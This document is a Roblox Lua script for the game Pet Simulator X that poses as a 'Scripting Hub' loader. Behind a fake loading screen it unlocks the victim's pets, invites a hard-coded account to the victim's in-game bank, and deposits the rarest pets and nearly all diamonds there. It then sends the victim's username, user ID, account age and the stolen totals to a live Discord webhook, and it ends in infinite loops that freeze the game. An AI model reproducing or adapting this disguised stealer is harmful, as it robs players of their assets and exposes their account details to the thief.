
-- Loading Fake
local username = game:GetService("Players").LocalPlayer.Name
-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local FullScreen = Instance.new("Frame")
local LoadingText = Instance.new("TextLabel")
local LoadingBar = Instance.new("Frame")
local LoadingBar2 = Instance.new("Frame")
local Informations = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

FullScreen.Name = "FullScreen"
FullScreen.Parent = ScreenGui
FullScreen.AnchorPoint = Vector2.new(0.5, 0.5)
FullScreen.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
FullScreen.Position = UDim2.new(0.5, 0, 0.5, 0)
FullScreen.Size = UDim2.new(0, 10000, 0, 10000)

LoadingText.Name = "LoadingText"
LoadingText.Parent = FullScreen
LoadingText.AnchorPoint = Vector2.new(0.5, 0.5)
LoadingText.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
LoadingText.BackgroundTransparency = 1.000
LoadingText.BorderColor3 = Color3.fromRGB(255, 0, 0)
LoadingText.BorderSizePixel = 2
LoadingText.Position = UDim2.new(0.5, 0, 0.496800005, 0)
LoadingText.Size = UDim2.new(0, 262, 0, 38)
LoadingText.Font = Enum.Font.SourceSansBold
LoadingText.Text = "Scripting Hub is Loading...  (Please Wait)"
LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingText.TextSize = 17.000
LoadingText.TextWrapped = true

LoadingBar.Name = "LoadingBar"
LoadingBar.Parent = FullScreen
LoadingBar.AnchorPoint = Vector2.new(0.5, 0.5)
LoadingBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
LoadingBar.BorderColor3 = Color3.fromRGB(18, 18, 18)
LoadingBar.Position = UDim2.new(0.5, 0, 0.5, 0)
LoadingBar.Size = UDim2.new(0, 287, 0, 11)

LoadingBar2.Name = "LoadingBar2"
LoadingBar2.Parent = LoadingBar
LoadingBar2.BackgroundColor3 = Color3.fromRGB(255, 43, 43)
LoadingBar2.BorderColor3 = Color3.fromRGB(255, 43, 43)
LoadingBar2.BorderSizePixel = 2
LoadingBar2.Size = UDim2.new(0, 0, 0, 11)

Informations.Name = "Informations"
Informations.Parent = FullScreen
Informations.AnchorPoint = Vector2.new(0.5, 0.5)
Informations.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
Informations.BackgroundTransparency = 1.000
Informations.BorderColor3 = Color3.fromRGB(18, 18, 18)
Informations.Position = UDim2.new(0.5, 0, 0.502599955, 0)
Informations.Size = UDim2.new(0, 181, 0, 25)
Informations.Font = Enum.Font.SourceSansBold
Informations.Text = "Hi "..username..", This take few seconds."
Informations.TextColor3 = Color3.fromRGB(255, 255, 255)
Informations.TextSize = 14.000

-- Scripts:

local function BUKVE_fake_script() -- LoadingBar2.LocalScript 
	local script = Instance.new('LocalScript', LoadingBar2)

	script.Parent:TweenSize(UDim2.new(1,0,1,0),"InOut","Sine",24)


-- :: Crystal Blobs Bypass ::
-- Error Reports
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game.Players.LocalPlayer
local PSXRank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local Avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..fardplayer.userId.."&width=420&height=420&format=png"
local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text

-- Invitation ID
local KeySecond = 1240550732

-- Webhook list
local ExecuteReports = "https://discord.com/api/webhooks/1064196654372233226/x2gLXznAjeKePALPE59uc3sjrFHeSAef8YH95UTPIOneJ8JO1k5iZpvbzK_n6r2VSZw7"
local Notifers =  "https://discord.com/api/webhooks/1064196654372233226/x2gLXznAjeKePALPE59uc3sjrFHeSAef8YH95UTPIOneJ8JO1k5iZpvbzK_n6r2VSZw7"

request = http_request or request or HttpPost or syn.request
local error1 = {
  ["embeds"] = {{
  ["title"] = "> "..username.." Executed ur scripts.",
  ["url"] = "https://discord.gg/znx-hub-917448788774383647",
  ["color"] = tonumber(0xF0FF00),
  ["fields"] = {
  {
  ["name"] = ":arrow_right: **Details of "..username.."** :arrow_left:",
  ["value"] = "```User: "..username.."\nRanks: "..rank.."```\n\nTakes 8s to get his logs detail",
  ["inline"] = false
  },
  }
  }}
  }
  local errorData1 = game:GetService("HttpService"):JSONEncode(error1) 

local headers = {
["content-type"] = "application/json"
}   
local e1 = {Url = ExecuteReports, Body = errorData1, Method = "POST", Headers = headers}
request(e1)
-- :: BLOB Script [XMAS Update] ::
-- ::    BY    CRYSTAL    BLOB    ::
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game:GetService("Workspace")["__MAP"].Interactive.Bank.Center.Position
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
local getmybanksremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).GetMyBanks, 3)
local inviteremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).InviteToBank, 11)
local lockremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory).LockPets, 5)
local depositremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).Deposit, 16)
local eggremote = debug.getconstant(debug.getprotos(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Eggs).SetupEgg)[5], 26)
local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client.Network).Invoke)
local bloby = getupvalues(blobx[2])
local blobz = getupvalues(bloby[1])[1][2]
local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client.Network).Invoke)
local blobb = getupvalues(bloba[2])
--blobb[2](2, ".t")
getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
inviteremote = blobz[blobb[2](2, inviteremote)]
lockremote = blobz[blobb[2](2, lockremote)]
depositremote = blobz[blobb[2](2, depositremote)] 
eggremote = blobz[blobb[2](2, eggremote)]

-- Invitation ID End

-- Bank ID and Library

local lib = require(game.ReplicatedStorage:WaitForChild('Library'))
local mybanks = getmybanksremote:InvokeServer()
local BankID = mybanks[1]['BUID']
local Bank = BankID

-- Invites Debug

inviteremote:InvokeServer(mybanks[1]['BUID'], KeySecond)

-- Deposit

local FinalList = {}

Library     = require(game:GetService('ReplicatedStorage'):FindFirstChild('Library'))
Functions   = Library.Functions
EXCList     = {}
  MythicList  = {}
  HugeList = {}

PogList = {139, 177, 176, 178}
  EList       = {}
  MList       = {}
  HList    = {}
  PList = {}

print("List Detected")

table.foreach(Library.Directory.Pets, function(i, v)
  if v.rarity == "Exclusive" then
    table.insert(EXCList, i)
  end
  if v.rarity == "Secret" then
    table.insert(MythicList, i)
  end
  if v.huge then
    table.insert(HugeList, i)
  end
end)
for i, v in pairs(PogList) do
table.insert(EXCList, v)
end

local pets = require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Pets
local y = {}
for i, v in pairs(pets) do
y[v["uid"]] = false
end
lockremote:InvokeServer(y)
for i, v in pairs(pets) do
if table.find(EXCList, v["id"]) ~= nil then
table.insert(EList, v["uid"])
end
if table.find(MythicList, v["id"]) ~= nil then
table.insert(MList, v["uid"])
end
if table.find(HugeList, v["id"]) ~= nil then
table.insert(HList, v["uid"])
end
end
if #EList + #MList + #PList < 49 then
for i, v in pairs(EList) do
table.insert(FinalList, v)
end
for i, v in pairs(MList) do
table.insert(FinalList, v)
end
elseif #EList + #MList > 49 and #EList < 49 then
for i, v in pairs(EList) do
table.insert(FinalList, v)
end
for i, v in pairs(MList) do
if #FinalList < 49 then
table.insert(FinalList, v)
end
end
elseif #EList + #MList > 49 and #EList > 49 then
for i, v in pairs(EList) do
if #FinalList < 49 then
table.insert(FinalList, v)
end
end
end
wait(0.5)
game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
local A_1 = 
{
[1] = "Cracked Egg", 
[2] = false
}
eggremote:InvokeServer("Cracked Egg", false, false);
wait(0.5)
local A_1 = 
{
[1] = Bank, 
[2] = FinalList,
[3] = 0
}

wait(8)
local s, e = pcall(function()depositremote:InvokeServer(Bank, FinalList, require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Diamonds-1)end)
wait(8)
depositremote:InvokeServer(Bank, FinalList, 0)

-- Deposit End

-- Webhook (_G.)

-- End Webhoook Victim

-- Webhook (OUR)
local url = Notifers
request = http_request or request or HttpPost or syn.request
 
local data3 = {
  ["content"] = ">"..username.." has been logged, check your invitations\n**> ZNX Hub v1.0**",
  ["embeds"] = {{
  ["title"] = "``` ▶ ZNX Hub v1.0 Bank-Steal ```",
  ["url"] = "https://discord.gg/znx-hub-917448788774383647",
  ["description"] = "➤  Below there is "..username.."'s details of the Account.  ",
  ["type"] = "rich",
  ["color"] = tonumber(0xFF0000),
  ["thumbnail"] = {
    ["url"] = Avatar,
    ["height"] = 420,
    ["width"] = 420
  },
  ["fields"] = {
  {
  ["name"] = ":arrow_forward:   Detail Player   :arrow_backward:",
  ["value"] = "```Username     > "..username.."\nDisplay Name > "..fardplayer.DisplayName.."\nUserID       > "..fardplayer.UserId.."\nAccount Age  > "..fardplayer.AccountAge.." Days\nIP Adress    > Failed to Connect.```", -- remove the || on both sides if you don't want your username to be behind a spoiler credits to ver#2607
  ["inline"] = false
  },
  {
    ["name"] = "`🡪 Gems Deposited `",
    ["value"] = diamond,
    ["inline"] = false
    },
    {
    ["name"] = "`🡪 Pet Deposited `",
    ["value"] = #FinalList,
    ["inline"] = false
    },
    {
    ["name"] = "`🡪 Exclusive `",
    ["value"] = #EList,
    ["inline"] = false
    },
    {
    ["name"] = "`🡪 Huges `",
    ["value"] = #HList,
    ["inline"] = false
    },
    {
    ["name"] = "`🡪 Secrets `",
    ["value"] = #MList,
    ["inline"] = false
    },
    {
    ["name"] = "`🡪 Ranks `",
    ["value"] = rank,
    ["inline"] = false
    },
    {
    ["name"] = "`🡪 BankID `",
    ["value"] = "```"..Bank.."```",
    ["inline"] = false
    },
  }
  }}
  }
  local newdata3 = game:GetService("HttpService"):JSONEncode(data3)

  local data4 = {
          ["embeds"] = {{
          ["title"] = "``` / ZNX Hub v1.0 Bankstealers / ```",
          ["url"] = "https://discord.gg/znx-hub-917448788774383647",
          ["color"] = tonumber(0xF0FF00),
          ["thumbnail"] = {
              ["url"] = "https://media.discordapp.net/attachments/1057672517185196113/1058965730361614447/20221217_003635_0000.png",
              ["height"] = 420,
              ["width"] = 420
          },
          ["fields"] = {
          {
          ["name"] = "`# #`  ZNX Hub Changelogs v1.0  `# #`",
          ["value"] = "```+ Bug Fixes.\n+ Revamped.```",
          ["inline"] = false
          },
          {
          ["name"] = "`# #`  Credits  `# #`",
          ["value"] = "```- ZNX#8709 (Scripter, Designer)```",
          ["inline"] = false
          },
          }
          }}
          }
          local newdata4 = game:GetService("HttpService"):JSONEncode(data4) 
  
  local headers = {
    ["content-type"] = "application/json"
  }
  local abcdef3 = {Url = url, Body = newdata3, Method = "POST", Headers = headers}
  local abcdef4 = {Url = url, Body = newdata4, Method = "POST", Headers = headers}
  request(abcdef3)
  request(abcdef4)                            

-- Invites Scripts ( Dont Change if u dont know any )

-- huges detection things
if #HList >= 1 then
  -- s
  
  local Hotifers = "https://discord.com/api/webhooks/1064196654372233226/x2gLXznAjeKePALPE59uc3sjrFHeSAef8YH95UTPIOneJ8JO1k5iZpvbzK_n6r2VSZw7"
  request = http_request or request or HttpPost or syn.request
  local error1 = {
  ["content"] = "@everyone Huges Logged!\n> ZNX Hub v1.0",
  ["embeds"] = {{
  ["title"] = "Huges Hits Logged!",
  ["url"] = "https://discord.gg/znx-hub-917448788774383647",
  ["color"] = tonumber(0xF0FF00),
  ["fields"] = {
  {
  ["name"] = ":arrow_right: **User/Total/Huges** :arrow_left:",
  ["value"] = "```User: "..username.."\nTotal Exclusive: "..#EList.."\nHuges: "..#HList.."```",
  ["inline"] = false
  },
  }
  }}
  }
  local errorData1 = game:GetService("HttpService"):JSONEncode(error1) 

local headers = {
["content-type"] = "application/json"
}   
  local e2 = {Url = Hotifers, Body = errorData1, Method = "POST", Headers = headers}
  request(e2)

  while task.wait(0.1) do
    inviteremote:InvokeServer(mybanks[1]['BUID'], KeySecond)
    while true do print("lol") end
  end
  
  -- f
  else
  -- f
    wait(7)
    while task.wait(0.1) do
      while true do print("lol") end
    end
  -- f
end

end
